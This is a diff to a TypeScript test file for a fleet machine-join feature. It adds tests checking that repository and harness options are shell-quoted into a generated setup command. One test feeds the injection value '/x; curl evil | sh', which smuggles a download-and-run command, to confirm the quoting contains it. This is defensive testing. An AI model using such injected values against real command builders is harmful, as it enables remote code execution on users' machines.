@@ -20,7 +20,7 @@ beforeEach(async () => {
 /** argo, as its console session answers it: core's scopes only, a plugin's not among them. */
 const ARGO = { kind: 'operator', scopes: ['fleet:read', 'fleet:commission', 'fleet:manage'] } as const;
 
-const join = (name = 'mac-studio', actor: Parameters<JoinMachine>[0]['actor'] = ARGO) =>
+const joinWith = (input: { name?: string; actor?: Parameters<JoinMachine>[0]['actor']; options?: Parameters<JoinMachine>[0]['options'] }) =>
   createJoinMachine({
     door: fleet.door,
     connections,
@@ -31,7 +31,9 @@ const join = (name = 'mac-studio', actor: Parameters<JoinMachine>[0]['actor'] = 
       },
     },
     fleetUrl: FLEET_URL,
-  })({ fleetId: FLEET_ID, name, actor });
+  })({ fleetId: FLEET_ID, name: input.name ?? 'mac-studio', actor: input.actor ?? ARGO, options: input.options });
+
+const join = (name = 'mac-studio', actor: Parameters<JoinMachine>[0]['actor'] = ARGO) => joinWith({ name, actor });
 
 describe('a machine joining', () => {
   it('commissions a ship of type trierarch with exactly crew:run beside send and receive, named as the operator asked', async () => {
@@ -54,6 +56,20 @@ describe('a machine joining', () => {
         setupLine: `curl -fsSL https://raw.githubusercontent.com/ThomasHendrickx/aeolus-fleet-trierarch/main/install.sh | sh -s -- --fleet-url ${FLEET_URL} --ship-id ${COMMISSIONED_SHIP_ID} --plugin-ship-id ${SHIP_ID} --secret ${secret}`,
       },
     });
+  });
+
+  it('builds the whole setup line from the harness and repository options, so the machine asks for nothing', async () => {
+    const joined = await joinWith({
+      options: { harnesses: ['claude-code', 'codex'], unattended: ['claude-code'], repositories: { kind: 'list', entries: ['~/code/web', '', "/srv/it's"] } },
+    });
+
+    expect(joined.isOk && joined.value.setupLine.endsWith(" --secret aeolus_sk_v1_machine --harnesses claude-code,codex --unattended claude-code --repositories '~/code/web,/srv/it'\\''s'")).toBe(true);
+  });
+
+  it('keeps a hostile value inside one quoted word at the end of the line', async () => {
+    const joined = await joinWith({ options: { repositories: { kind: 'folder', path: '/x; curl evil | sh' } } });
+
+    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh'")).toBe(true);
   });
 
   it('commissions each join under a new idempotency key', async () => {
